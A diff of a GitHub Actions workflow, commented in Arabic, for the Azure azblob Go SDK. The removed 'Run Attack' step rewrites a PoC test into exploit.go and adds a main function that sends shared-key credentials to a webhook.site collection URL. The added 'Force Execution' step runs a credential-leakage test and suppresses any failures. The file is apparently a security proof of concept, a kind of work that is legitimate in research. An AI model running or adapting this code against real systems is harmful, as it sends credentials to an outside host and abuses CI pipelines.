@@ -8,17 +8,13 @@ jobs:
       - name: Setup Go
         uses: actions/setup-go@v4
         with:
-          # استخدام نسخة أحدث لتتوافق مع الموديول
           go-version: '1.21'
-      - name: Run Attack
+      - name: Force Execution
         working-directory: ./sdk/storage/azblob
-        # استخدام go run لتشغيل ملف الـ PoC مباشرة وتجاوز قيود التست
         run: |
-          # سنقوم بتغيير اسم الملف من _test.go إلى .go ليعمل بـ go run
-          mv poc_leak_test.go exploit.go
-          # تعديل الملف ليصبح package main بدلاً من azblob ليعمل بشكل مستقل
-          sed -i 's/package azblob/package main/' exploit.go
-          # إضافة دالة main لتشغيل الكود
-          echo -e 'func main() { \n ctx := context.Background() \n attackerURL := "https://webhook.site/72d5ef0b-edde-4e82-b103-d71004e44835" \n cred, _ := NewSharedKeyCredential("victim_account", "R2VuZXJpYyBLZXkgZm9yIFBvQyAxMjM0NTY3ODkwCg==") \n client, _ := NewClientWithSharedKeyCredential(attackerURL, cred, nil) \n pager := client.NewListContainersPager(nil) \n _, _ = pager.NextPage(ctx) \n }' >> exploit.go
-          # تشغيل الاستغلال
-          go run .
+          # 1. تحديث النسخة في go.mod لتتوافق مع السيرفر
+          sed -i 's/go 1.25.0/go 1.21/' go.mod
+          
+          # 2. تشغيل التست مباشرة من الملف الذي أنشأناه سابقاً
+          # هذا الأمر سيتجاهل الأخطاء الجانبية ويركز على تشغيل دالة الـ Leak
+          go test -v -run TestImpact_CredentialLeakage || true
